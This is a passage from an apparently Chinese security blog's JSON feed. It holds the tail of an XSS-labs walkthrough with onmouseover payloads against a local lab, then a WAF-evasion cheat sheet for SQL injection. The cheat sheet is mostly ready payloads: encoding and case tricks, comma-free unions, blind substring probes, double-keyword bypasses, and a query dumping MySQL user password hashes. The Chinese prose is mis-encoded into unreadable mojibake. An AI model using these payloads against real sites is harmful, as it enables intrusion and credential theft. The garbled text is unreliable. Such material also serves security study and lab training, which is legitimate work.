href=\"#ç¬¬åä¸ƒå…³\">#</a> <span class=\"label\">ç¬¬åä¸ƒå…³</span></h4>\n<p>è½¬ä¹‰åç»™äº† embed æ ‡ç­¾</p>\n<p>embed æ ‡ç­¾å¯ä»¥ç†è§£ä¸ºå®šä¹‰äº†ä¸€ä¸ªåŒºåŸŸï¼Œå¯ä»¥æ”¾å›¾ç‰‡ã€è§†é¢‘ã€éŸ³é¢‘ç­‰å†…å®¹ï¼Œä½†æ˜¯å‘¢ç›¸å¯¹äºä»–ä»¬ï¼Œembed æ ‡ç­¾æ‰“å¼€ä¸äº†æ–‡ä»¶çš„æ—¶å€™å°±ä¼šæ²¡æœ‰æ˜¾ç¤ºçš„åŒºåŸŸåœ¨ï¼Œä»–ä»¬å°±èƒ½æœ‰å—é”™è¯¯çš„åŒºåŸŸ</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/43.png\" alt=\"\"></p>\n<p><code>æ„å»º[http://127.0.0.1/xss-labs/level17.php?arg01=a&amp;arg02=234567%20onmouseover=%27alert(1)%27]</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/44.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬åå…«å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬åå…«å…³\">#</a> <span class=\"label\">ç¬¬åå…«å…³</span></h4>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS94c3MtbGFicy9sZXZlbDE4LnBocD9hcmcwMT1hJmFtcDthcmcwMj01NTUlMjBvbm1vdXNlb3Zlcj0lMjdhbGVydCgxKSUyNw==\">http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=555 onmouseover=â€˜alert(1)â€™</span>](<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS94c3MtbGFicy9sZXZlbDE4LnBocD9hcmcwMT1hJmFtcDthcmcwMj01NTU=\">http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=555</span> onmouseover=â€˜alert(1)â€™)</p>\n<p>ä¸€æ ·é€šå…³</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/45.png\" alt=\"\"></p>\n<h4 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> <span class=\"label\">æ€»ç»“</span></h4>\n<details class=\"info\"><summary>æ€»ç»“</summary><div>\n<div class=\"tab\" data-id=\"\" data-title=\"\">\n<ol>\n<li><code>æ— è¿‡æ»¤æœºåˆ¶ï¼šæŒ‡çš„æ˜¯åœ¨åº”ç”¨ç¨‹åºä¸­æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®è¿›è¡Œè¶³å¤Ÿçš„è¿‡æ»¤å’ŒéªŒè¯ï¼Œä»è€Œä½¿æ¶æ„ç”¨æˆ·èƒ½å¤Ÿæ’å…¥æ¶æ„ä»£ç ï¼Œä¾‹å¦‚JavaScriptï¼Œä»¥æ”»å‡»å…¶ä»–ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºã€‚</code></li>\n<li><code>é—­åˆæ ‡ç­¾ï¼šåœ¨HTMLæˆ–XMLä¸­ï¼Œæ”»å‡»è€…å°è¯•æ³¨å…¥æœªç»å…³é—­çš„æ ‡ç­¾ï¼Œä»¥ç ´åæ–‡æ¡£ç»“æ„æˆ–æ‰§è¡Œæ¶æ„ä»£ç ã€‚</code></li>\n<li><code>å•å¼•å·é—­åˆ + æ·»åŠ äº‹ä»¶ï¼šè¿™æ˜¯ä¸€ç§XSSæ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡åœ¨HTMLå±æ€§ä¸­æ’å…¥å•å¼•å·å¹¶æ·»åŠ JavaScriptäº‹ä»¶æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</code></li>\n<li><code>åŒå¼•å·é—­åˆ + æ·»åŠ äº‹ä»¶ï¼šç±»ä¼¼äºä¸Šé¢çš„æ”»å‡»ï¼Œä½†ä½¿ç”¨åŒå¼•å·æ¥é—­åˆå±æ€§ï¼Œå¹¶æ·»åŠ JavaScriptäº‹ä»¶ã€‚</code></li>\n<li><code>åŒå¼•å·é—­åˆ + æ–°å»ºæ ‡ç­¾ï¼šæ”»å‡»è€…å°è¯•é€šè¿‡åœ¨HTMLå±æ€§ä¸­æ’å…¥åŒå¼•å·å¹¶åˆ›å»ºæ–°çš„HTMLæ ‡ç­¾æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</code></li>\n<li><code>å¤§å°å†™ç»•è¿‡ï¼šæ”»å‡»è€…å°è¯•é€šè¿‡åœ¨æ ‡ç­¾å’Œå±æ€§åç§°ä¸­ä½¿ç”¨å¤§å°å†™æ··åˆæ¥ç»•è¿‡å®‰å…¨è¿‡æ»¤ã€‚</code></li>\n<li><code>åŒå†™ç»•è¿‡ï¼šæ”»å‡»è€…å°è¯•é€šè¿‡åœ¨æ ‡ç­¾æˆ–å±æ€§åç§°ä¸­ä½¿ç”¨åŒå†™æ¥ç»•è¿‡å®‰å…¨è¿‡æ»¤ï¼Œä¾‹å¦‚ä½¿ç”¨&lt;sccript&gt;ä»£æ›¿&lt;script&gt;ã€‚</code></li>\n<li><code>ç¼–ç ç»•è¿‡ï¼šæ”»å‡»è€…å¯èƒ½å°è¯•ä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰å­—ç¬¦æ¥ç»•è¿‡å®‰å…¨è¿‡æ»¤ï¼Œä½¿æµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚</code></li>\n<li><code>æ£€æµ‹å…³é”®å­—ï¼šå®‰å…¨è¿‡æ»¤å™¨é€šå¸¸ä¼šæ£€æŸ¥ç”¨æˆ·è¾“å…¥ä¸­çš„å…³é”®å­—ï¼Œä»¥è¯†åˆ«å’Œé˜²æ­¢æ¶æ„ä»£ç æ³¨å…¥ã€‚</code></li>\n<li><code>éšè—åŸŸæ‰“XSSï¼šæ”»å‡»è€…å°è¯•é€šè¿‡åœ¨HTMLè¡¨å•çš„éšè—å­—æ®µä¸­æ’å…¥æ¶æ„è„šæœ¬æ¥è¿›è¡ŒXSSæ”»å‡»ã€‚</code></li>\n<li><code>Refererå­—æ®µæ‰“XSSï¼šæ”»å‡»è€…å¯èƒ½ä¼šå°è¯•é€šè¿‡ä¼ªé€ Refererå­—æ®µçš„å€¼æ¥æ¬ºéª—æœåŠ¡å™¨ï¼Œä»¥æ‰§è¡ŒXSSæ”»å‡»ã€‚</code></li>\n<li><code>User-Agentå­—æ®µæ‰“XSSï¼šæ”»å‡»è€…å¯èƒ½ä¼šä¼ªé€ User-Agentå­—æ®µï¼Œè¯•å›¾ç»•è¿‡å®‰å…¨æªæ–½ä»¥è¿›è¡ŒXSSæ”»å‡»ã€‚</code></li>\n<li><code>Cookieå­—æ®µæ‰“XSSï¼šæ”»å‡»è€…å°è¯•é€šè¿‡åœ¨Cookieä¸­æ³¨å…¥æ¶æ„è„šæœ¬æ¥è¿›è¡ŒXSSæ”»å‡»ã€‚</code></li>\n<li><code>ä»£ç ä¸å…¨åšä¸äº†ï¼šæŒ‡çš„æ˜¯åº”ç”¨ç¨‹åºåœ¨æ¥æ”¶åˆ°ç”¨æˆ·è¾“å…¥åæ²¡æœ‰è¶³å¤Ÿçš„ä»£ç å®Œæ•´æ€§æ£€æŸ¥ï¼Œå¯¼è‡´å¯èƒ½æ— æ³•æ‰§è¡ŒæŸäº›å®Œæ•´æ€§è¦æ±‚çš„æ“ä½œã€‚</code></li>\n<li><code>ng-include å±æ€§ï¼šè¿™æ˜¯AngularJSä¸­çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œå¦‚æœä¸å—æ§åˆ¶åœ°å°†ç”¨æˆ·æä¾›çš„å†…å®¹åŒ…å«åœ¨ng-includeä¸­ï¼Œå¯èƒ½ä¼šå¯¼è‡´XSSæ”»å‡»ã€‚</code></li>\n<li><code>ç©ºæ ¼å®ä½“è½¬ä¹‰ï¼šæ”»å‡»è€…å¯èƒ½å°è¯•é€šè¿‡å°†ç©ºæ ¼å­—ç¬¦æ›¿æ¢ä¸ºHTMLå®ä½“ï¼Œæ¥ç»•è¿‡å®‰å…¨è¿‡æ»¤ã€‚</code></li>\n<li><code>embedå‚æ•°æ‹¼æ¥ï¼šæ”»å‡»è€…å°è¯•é€šè¿‡æ„é€ æ¶æ„çš„embedæ ‡ç­¾å‚æ•°æ¥æ‰§è¡ŒXSSæ”»å‡»ã€‚</code></li>\n</ol>\n</div>\n</div></details>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/",
            "url": "http://gyzero.shop/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/",
            "title": "sqlæ³¨å…¥ç»•è¿‡",
            "date_published": "2023-10-31T00:53:37.000Z",
            "content_html": "<p><span class=\"spoiler bulr\" title=\"...\">æ¬¢è¿è§‚çœ‹</span></p>\n<h3 id=\"å¤§å°å†™ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#å¤§å°å†™ç»•è¿‡\">#</a> <span class=\"kbd\">å¤§å°å†™ç»•è¿‡</span></h3>\n<p class=\"rainbow\">å°†å­—ç¬¦ä¸²è®¾ç½®ä¸ºå¤§å°å†™ï¼Œä¾‹å¦‚</p>\n<p class=\"rainbow\">and 1=1 è½¬æˆ AND 1=1 AnD 1= 1</p>\n<p class=\"rainbow\">select * from users where id=1 UNION SELECT 1,2,3,4</p>\n<p class=\"rainbow\">select * from users where id=1 UniON SelECT 1,2,3,4</p>\n<h3 class=\"kbd\" id=\"æµ®ç‚¹æ•°ç»•è¿‡æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#æµ®ç‚¹æ•°ç»•è¿‡æ³¨å…¥\">#</a> [æµ®ç‚¹æ•°ç»•è¿‡æ³¨å…¥]</h3>\n<p class=\"rainbow\">select * from users where id=8E0union select 1,2,3,4; </p>\n<p class=\"rainbow\">select * from users where id=8.0union select  1,2,3,4</p>\n<h3 id=\"null-å€¼ç»•-è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#null-å€¼ç»•-è¿‡\">#</a> <span class=\"kbd\">NULL å€¼ç»• è¿‡</span></h3>\n<p class=\"rainbow\">select \\N;  \\N ä»£è¡¨ç©º</p>\n<p class=\"rainbow\">select * from users where id=\\Nunion select 1,2,3,\\N;</p>\n<p class=\"rainbow\">select * from users where id=\\Nunion select 1,2,3,\\Nfrom users; </p>\n<h3 id=\"å¼•å·ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#å¼•å·ç»•è¿‡\">#</a> <span class=\"kbd\">å¼•å·ç»•è¿‡  </span></h3>\n<p class=\"rainbow\">å¦‚æœ waf æ‹¦æˆªè¿‡æ»¤å•å¼•å·çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åŒå¼•å· åœ¨ mysql é‡Œä¹Ÿå¯ä»¥ç”¨åŒå¼•å·ä½œä¸ºå­—ç¬¦ä¸²ã€‚</p>\n<p class=\"rainbow\">select * from users where id=â€˜1â€™;</p>\n<p class=\"rainbow\">select * from users where id=â€œ1â€; </p>\n<p class=\"rainbow\">ä¹Ÿå¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ 16 è¿›åˆ¶ å†è¿›è¡ŒæŸ¥è¯¢ã€‚</p>\n<p class=\"rainbow\">select hex(â€˜adminâ€™); </p>\n<p class=\"rainbow\">select * from users where username=â€˜adminâ€™;</p>\n<p class=\"rainbow\">select * from users where username=0x61646D696E; </p>\n<p class=\"rainbow\">å¦‚æœ gpc å¼€å¯äº†ï¼Œä½†æ˜¯æ³¨å…¥ç‚¹æ˜¯æ•´å½¢ ä¹Ÿå¯ä»¥ç”¨ hex åå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,(select group_concat(column_name) from {.rainbow}information_schema.columns where TABLE_NAME=â€˜usersâ€™ limit 1),4;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,(select group_concat(column_name) from {.rainbow}information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;</p>\n<p class=\"rainbow\">å¯ä»¥çœ‹åˆ°å­˜åœ¨æ•´å‹æ³¨å…¥çš„æ—¶å€™ æ²¡æœ‰ç”¨åˆ°å•å¼•å· æ‰€ä»¥å¯ä»¥æ³¨å…¥</p>\n<h3 id=\"æ·»åŠ åº“åç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#æ·»åŠ åº“åç»•è¿‡\">#</a> <span class=\"kbd\">æ·»åŠ åº“åç»•è¿‡ </span></h3>\n<p class=\"rainbow\">ä»¥ä¸‹ä¸¤æ¡æŸ¥è¯¢è¯­å¥ï¼Œæ‰§è¡Œçš„ç»“æœæ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯æœ‰äº› waf çš„æ‹¦æˆªè§„åˆ™ å¹¶ä¸ä¼šæ‹¦æˆª [åº“å].[è¡¨å] è¿™ç§æ¨¡å¼ã€‚</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,3,4 from users;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,3,4 from <span class=\"exturl\" data-url=\"aHR0cDovL2FkbWluLnVz\">admin.us</span> </p>\n<p class=\"rainbow\">mysql ä¸­ä¹Ÿå¯ä»¥æ·»åŠ åº“åæŸ¥è¯¢è¡¨ã€‚ä¾‹å¦‚è·¨åº“æŸ¥è¯¢ mysql åº“é‡Œçš„ usrs è¡¨çš„å†…å®¹ã€‚ select * from users where id=-1 union select 1,2,3,concat (user,authentication_string) from mysql.user;</p>\n<h3 id=\"å»é‡å¤ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#å»é‡å¤ç»•è¿‡\">#</a> <span class=\"kbd\">å»é‡å¤ç»•è¿‡  </span></h3>\n<p class=\"rainbow\">åœ¨ mysql æŸ¥è¯¢å¯ä»¥ä½¿ç”¨ distinct å»é™¤æŸ¥è¯¢çš„é‡å¤å€¼ã€‚å¯ä»¥åˆ©ç”¨è¿™ç‚¹çªç ´ waf æ‹¦æˆª</p>\n<p class=\"rainbow\">select * from users where id=-1 union distinct select 1,2,3,4 from users;</p>\n<p class=\"rainbow\">select * from users where id=-1 union distinct select 1,2,3,version() from users; </p>\n<h3 id=\"åå¼•å·ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#åå¼•å·ç»•è¿‡\">#</a> <span class=\"kbd\">åå¼•å·ç»•è¿‡  </span></h3>\n<p>åœ¨ mysql å¯ä»¥ä½¿ç”¨  <code>è¿™é‡Œæ˜¯åå¼•å·</code>  ç»•è¿‡ä¸€äº› waf æ‹¦æˆªã€‚å­—æ®µå¯ä»¥åŠ åå¼•å·æˆ–è€…ä¸åŠ ï¼Œæ„ä¹‰ç›¸åŒã€‚</p>\n<p class=\"rainbow\">insert into users(username,password,email)values(â€˜adminâ€™,â€˜123456â€™,â€˜admin@admin.comâ€™);</p>\n<p class=\"rainbow\">insert into users( <code>username</code> , <code>password</code> , <code>email</code> )values(â€˜adminâ€™,â€˜123456â€™,â€˜admin@admin.comâ€™); </p>\n<h3 id=\"è„šæœ¬è¯­è¨€ç‰¹æ€§ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#è„šæœ¬è¯­è¨€ç‰¹æ€§ç»•è¿‡\">#</a> <span class=\"kbd\">è„šæœ¬è¯­è¨€ç‰¹æ€§ç»•è¿‡</span></h3>\n<p class=\"rainbow\">åœ¨ php è¯­è¨€ä¸­ id=1&amp;id=2 åé¢çš„å€¼ä¼šè‡ªåŠ¨è¦†ç›–å‰é¢çš„å€¼ï¼Œä¸åŒçš„è¯­è¨€æœ‰ä¸åŒçš„ç‰¹æ€§ã€‚å¯ä»¥åˆ©ç”¨è¿™ç‚¹ç»•è¿‡ä¸€ äº› waf çš„æ‹¦æˆªã€‚</p>\n<p class=\"rainbow\">id=1%00&amp;id=2 union select 1,2,3</p>\n<p class=\"rainbow\">æœ‰äº› waf ä¼šå»åŒ¹é…ç¬¬ä¸€ä¸ª id å‚æ•° 1%00 %00 æ˜¯æˆªæ–­å­—ç¬¦ï¼Œwaf ä¼šè‡ªåŠ¨æˆªæ–­ ä»è€Œä¸ä¼šæ£€æµ‹åé¢çš„å†…å®¹ã€‚åˆ°äº† ç¨‹åºä¸­ id å°±æ˜¯ç­‰äº id=2 union select 1,2,3 ä»ç»•è¿‡æ³¨å…¥æ‹¦æˆªã€‚ å…¶ä»–è¯­è¨€ç‰¹æ€§ </p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/jkjkjk.png\" alt=\"\"></p>\n<h3 id=\"é€—å·ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#é€—å·ç»•è¿‡\">#</a> <span class=\"kbd\">é€—å·ç»•è¿‡  </span></h3>\n<p class=\"rainbow\">ç›®å‰æœ‰äº›é˜²æ³¨å…¥è„šæœ¬éƒ½ä¼šé€—å·è¿›è¡Œæ‹¦æˆªï¼Œä¾‹å¦‚å¸¸è§„æ³¨å…¥ä¸­å¿…é¡»åŒ…å«é€—å·</p>\n<p class=\"rainbow\">select * from users where id=1 union select 1,2,3,4;</p>\n<p class=\"rainbow\">ä¸€èˆ¬ä¼šå¯¹é€—å·è¿‡æ»¤æˆç©º select * from users where id=1 union select 1 2 3 4; è¿™æ · SQL è¯­å¥å°±ä¼šå‡ºé”™ã€‚ æ‰€ä»¥ å¯ä»¥ä¸ä½¿ç”¨é€—å·è¿›è¡Œ SQL </p>\n<h4 id=\"substr-æˆªå–å­—ç¬¦ä¸²\"><a class=\"markdownIt-Anchor\" href=\"#substr-æˆªå–å­—ç¬¦ä¸²\">#</a> <span class=\"kbd\">substr æˆªå–å­—ç¬¦ä¸²</span></h4>\n<p class=\"rainbow\">select(substr(database() from 1 for 1));</p>\n<p class=\"rainbow\">æŸ¥è¯¢å½“å‰åº“ç¬¬ä¸€ä¸ªå­—ç¬¦ æŸ¥è¯¢ m ç­‰äº select (substr (database () from 1 for 1)) é¡µé¢è¿”å›æ­£å¸¸</p>\n<p class=\"rainbow\">select * from users where id=1 and â€˜mâ€™=(select(substr(database() from 1 for 1)));</p>\n<p class=\"rainbow\">å¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ– m æ¢æˆ hex 0x6D è¿™æ ·å°±é¿å…äº†å•å¼•å·</p>\n<p class=\"rainbow\">select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1))); </p>\n<h4 class=\"kbd\" id=\"min-æˆªå–å­—ç¬¦ä¸²\"><a class=\"markdownIt-Anchor\" href=\"#min-æˆªå–å­—ç¬¦ä¸²\">#</a> [min æˆªå–å­—ç¬¦ä¸²]</h4>\n<p class=\"rainbow\">è¿™ä¸ª min å‡½æ•°è·Ÿ substr å‡½æ•°åŠŸèƒ½ç›¸åŒ å¦‚æœ substr å‡½æ•°è¢«æ‹¦æˆªæˆ–è€…è¿‡æ»¤å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ä»£æ›¿ã€‚</p>\n<p class=\"rainbow\">select mid (database () from 1 for 1); è¿™ä¸ªæ–¹æ³•å¦‚ä¸Šã€‚</p>\n<p class=\"rainbow\">select * from users where id=1 and â€˜mâ€™=(select(mid(database() from 1 for 1)));</p>\n<p class=\"rainbow\">select * from users where id=1 and 0x6D=(select(mid(database() from 1 for 1))); </p>\n<h4 id=\"ä½¿ç”¨-join-ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ä½¿ç”¨-join-ç»•è¿‡\">#</a> <span class=\"kbd\">ä½¿ç”¨ join ç»•è¿‡ </span></h4>\n<p class=\"rainbow\">ä½¿ç”¨ join è‡ªè¿æ¥ä¸¤ä¸ªè¡¨ union select 1,2 #ç­‰ä»·äº union select * from (select 1) a join (select 2) b a å’Œ b åˆ†åˆ«æ˜¯è¡¨çš„åˆ«å</p>\n<p class=\"rainbow\">select * from users where id=-1 union select 1,2,3,4;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c join(select 4)d;</p>\n<p class=\"rainbow\">select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c join(select 4)d;</p>\n<p class=\"rainbow\">å¯ä»¥çœ‹åˆ°è¿™é‡Œä¹Ÿæ²¡æœ‰ä½¿ç”¨é€—å·ï¼Œä»è€Œç»•è¿‡ waf </p>\n<h4 class=\"kbd\" id=\"like-ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#like-ç»•è¿‡\">#</a> [like ç»•è¿‡]</h4>\n<p class=\"rainbow\">ä½¿ç”¨ like æ¨¡ç³ŠæŸ¥è¯¢ select user () like â€˜% r%â€™; æ¨¡ç³ŠæŸ¥è¯¢æˆåŠŸè¿”å› 1 å¦åˆ™è¿”å› 0 æ‰¾åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦åç»§ç»­è¿›è¡Œä¸‹ä¸€ä¸ªå­—ç¬¦åŒ¹é…ã€‚ä»è€Œæ‰¾åˆ°æ‰€æœ‰çš„å­—ç¬¦ä¸² æœ€åå°±æ˜¯è¦æŸ¥è¯¢çš„å†…å®¹ï¼Œè¿™ç§ SQL æ³¨ å…¥è¯­å¥ä¹Ÿä¸ä¼šå­˜åœ¨é€—å·ã€‚ä»è€Œç»•è¿‡ waf æ‹¦æˆª </p>\n<h4 id=\"limit-offset-ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#limit-offset-ç»•è¿‡\">#</a> <span class=\"kbd\">limit offset ç»•è¿‡ </span></h4>\n<p class=\"rainbow\">SQL æ³¨å…¥æ—¶ï¼Œå¦‚æœéœ€è¦é™å®šæ¡ç›®å¯ä»¥ä½¿ç”¨ limit 0,1 é™å®šè¿”å›æ¡ç›®çš„æ•°ç›® limit 0,1 è¿”å›æ¡ä¸€æ¡è®°å½• å¦‚æœ å¯¹é€—å·è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ limit 1 é»˜è®¤è¿”å›ç¬¬ä¸€æ¡æ•°æ®ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ limit 1 offset 0 ä»é›¶å¼€å§‹è¿” å›ç¬¬ä¸€æ¡è®°å½•ï¼Œè¿™æ ·å°±ç»•è¿‡ waf </p>\n<h3 class=\"kbd\" id=\"or-and-xor-not-ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#or-and-xor-not-ç»•è¿‡\">#</a> [or and xor not ç»•è¿‡]</h3>\n<p class=\"rainbow\">ç›®å‰ä¸»æµçš„ waf éƒ½ä¼šå¯¹ id=1 and 1=2ã€id=1 or 1=2ã€id=0 or 1=2 id=0 xor 1=1 limit 1 ã€id=1 xor 1=2 å¯¹è¿™äº›å¸¸è§çš„ SQL æ³¨å…¥æ£€æµ‹è¯­å¥è¿›è¡Œæ‹¦æˆªã€‚åƒ and è¿™äº›è¿˜æœ‰å­—ç¬¦ä»£æ›¿ å­—ç¬¦å¦‚ä¸‹ </p>\n<p class=\"rainbow\">and ç­‰äº &amp;&amp;</p>\n<p class=\"rainbow\">or ç­‰äº ||</p>\n<p class=\"rainbow\">not ç­‰äºï¼</p>\n<p class=\"rainbow\">xor ç­‰äº |</p>\n<p class=\"rainbow\">æ‰€ä»¥å¯ä»¥è½¬æ¢æˆè¿™æ ·</p>\n<p class=\"rainbow\">id=1 and 1=1 ç­‰äº id=1 &amp;&amp; 1=1</p>\n<p class=\"rainbow\">id=1 and 1=2 ç­‰äº id=1 &amp;&amp; 1=2</p>\n<p class=\"rainbow\">id=1 or 1=1 ç­‰äº id=1 || 1=1</p>\n<p class=\"rainbow\">id=0 or 1=0 ç­‰äº   id=0 || 1=0 </p>\n<p class=\"rainbow\">å¯ä»¥ç»•è¿‡ä¸€äº› waf æ‹¦æˆªç»§ç»­å¯¹æ³¨å…¥ç‚¹è¿›è¡Œå®‰å…¨æ£€æµ‹</p>\n<p class=\"rainbow\">ä¹Ÿå¯ä»¥ä½¿ç”¨è¿ç®—ç¬¦å·</p>\n<p class=\"rainbow\">id=1 &amp;&amp; 2=1+1</p>\n<p class=\"rainbow\">id=1 &amp;&amp;   2=1-1 </p>\n<h3 id=\"ascii-å­—ç¬¦å¯¹æ¯”ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ascii-å­—ç¬¦å¯¹æ¯”ç»•è¿‡\">#</a> <span class=\"kbd\">ascii å­—ç¬¦å¯¹æ¯”ç»•è¿‡ </span></h3>\n<p class=\"rainbow\">è®¸å¤š waf ä¼šå¯¹ union select è¿›è¡Œæ‹¦æˆª è€Œä¸”é€šå¸¸æ¯”è¾ƒå˜æ€ï¼Œé‚£ä¹ˆå¯ä»¥ä¸ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ æˆªå–å¯¹æ¯”æ³•ï¼Œè¿›è¡Œçªç ´ã€‚</p>\n<p class=\"rainbow\">select substring(user(),1,1);</p>\n<p class=\"rainbow\">select * from users where id=1 and substring(user(),1,1)=â€˜râ€™;</p>\n<p class=\"rainbow\">select * from users where id=1 and ascii(substring(user(),1,1))=114;</p>\n<p class=\"rainbow\">æœ€å¥½æŠŠâ€™râ€™æ¢æˆæˆ ascii ç  å¦‚æœå¼€å¯ gpc int æ³¨å…¥å°±ä¸èƒ½ç”¨äº†ã€‚ å¯ä»¥çœ‹åˆ°æ„é€ å¾— SQL æ”»å‡»è¯­å¥æ²¡æœ‰ä½¿ç”¨è”åˆæŸ¥è¯¢ (union select) ä¹Ÿå¯ä»¥æŠŠæ•°æ®æŸ¥è¯¢å‡ºæ¥ </p>\n<h3 class=\"kbd\" id=\"ç­‰å·ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ç­‰å·ç»•è¿‡\">#</a> [ç­‰å·ç»•è¿‡]</h3>\n<p class=\"rainbow\">å¦‚æœç¨‹åºä¼šå¯¹ = è¿›è¡Œæ‹¦æˆª å¯ä»¥ä½¿ç”¨ like rlike regexp æˆ–è€…ä½¿ç”¨ &lt;æˆ–è€…&gt;</p>\n<p class=\"rainbow\">select * from users where id=1 and ascii(substring(user(),1,1))&lt;115;</p>\n<p class=\"rainbow\">select * from users where id=1 and ascii(substring(user(),1,1))&gt;115;</p>\n<p class=\"rainbow\">select * from users where id=1 and (select substring(user(),1,1)like â€˜r%â€™);</p>\n<p class=\"rainbow\">select * from users where id=1 and (select substring(user(),1,1)rlike â€˜râ€™) </p>\n<p class=\"rainbow\">select * from users where id=1 and 1=(select user() regexp â€˜^râ€™);</p>\n<p class=\"rainbow\">select * from users where id=1 and 1=(select user() regexp â€˜^aâ€™);</p>\n<p class=\"rainbow\">regexp åé¢æ˜¯æ­£åˆ™ </p>\n<h3 class=\"kbd\" id=\"åŒå…³é”®è¯ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#åŒå…³é”®è¯ç»•è¿‡\">#</a> [åŒå…³é”®è¯ç»•è¿‡]</h3>\n<p class=\"rainbow\">æœ‰äº›ç¨‹åºä¼šå¯¹å•è¯ unionã€ select è¿›è¡Œè½¬ç©º ä½†æ˜¯åªä¼šè½¬ä¸€æ¬¡è¿™æ ·ä¼šç•™ä¸‹å®‰å…¨éšæ‚£ã€‚ åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„ union å°±èƒ½ç»•è¿‡ï¼‰</p>\n<p class=\"rainbow\">id=-1â€™UNIunionONSeLselectECT1,2,3â€“+ åˆ°æ•°æ®åº“é‡Œæ‰§è¡Œä¼šå˜æˆ id=-1â€™UNION SeLECT1,2,3â€“+ ä»è€Œç»•è¿‡æ³¨å…¥ </p>\n<h3 id=\"union-select-ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#union-select-ç»•è¿‡\">#</a> <span class=\"kbd\">union select ç»•è¿‡ </span></h3>\n<p class=\"rainbow\">ç›®å‰ä¸å°‘ waf éƒ½ä¼šä½¿ç”¨éƒ½ä¼šå¯¹ union select è¿›è¡Œæ‹¦æˆª å•ä¸ªä¸æ‹¦æˆª ä¸€èµ·å°±è¿›è¡Œæ‹¦æˆªã€‚</p>\n<p class=\"rainbow\">é’ˆå¯¹å•ä¸ªå…³é”®è¯ç»•è¿‡ sel&lt;&gt;ect ç¨‹åºè¿‡æ»¤ &lt;&gt; ä¸ºç©º è„šæœ¬å¤„ç†</p>\n<p class=\"rainbow\">sele/<strong>/ct ç¨‹åºè¿‡æ»¤ /</strong>/ ä¸ºç©º</p>\n<p class=\"rainbow\">/<em>!%53eLEct</em>/url ç¼–ç ä¸å†…è”æ³¨é‡Š</p>\n<p class=\"rainbow\">se%0blect ä½¿ç”¨ç©ºæ ¼ç»•è¿‡</p>\n<p class=\"rainbow\">sele% ct ä½¿ç”¨ç™¾åˆ†å·ç»•è¿‡</p>\n<p class=\"rainbow\">%53eLEct ç¼–ç ç»•è¿‡</p>\n<p class=\"rainbow\">å¤§å°å†™</p>\n<p class=\"rainbow\">uNIoN sELecT 1,2</p>\n<p class=\"rainbow\">union all select 1,2</p>\n<p class=\"rainbow\">union DISTINCT select 1,2</p>\n<p class=\"rainbow\">null+UNION+SELECT+1,2</p>\n<p class=\"rainbow\">/<em>!union</em>//<em>!select</em>/1,2</p>\n<p 